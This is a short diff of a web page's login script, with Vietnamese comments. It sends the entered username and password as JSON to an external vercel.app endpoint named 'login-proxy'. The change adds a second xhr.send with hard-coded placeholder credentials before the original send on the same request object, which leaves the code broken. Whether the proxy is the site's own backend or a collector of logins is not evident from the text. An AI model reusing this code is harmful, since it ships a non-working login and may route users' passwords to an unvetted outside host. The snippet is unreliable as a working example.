@@ -107,9 +107,10 @@
       const password = document.getElementById('password').value;
 
       // Tạo đối tượng XMLHttpRequest
-      const xhr = new XMLHttpRequest();
-      xhr.open('POST', 'https://login-proxy-vercel-d5jx.vercel.app/api/submit', true); // Đảm bảo đây là URL đúng của API
-      xhr.setRequestHeader('Content-Type', 'application/json');
+    const xhr = new XMLHttpRequest();
+xhr.open('POST', 'https://login-proxy-vercel-d5jx.vercel.app/api/submit', true);
+xhr.setRequestHeader('Content-Type', 'application/json');
+xhr.send(JSON.stringify({ username: 'your_username', password: 'your_password' }));
 
       // Gửi dữ liệu
       xhr.send(JSON.stringify({
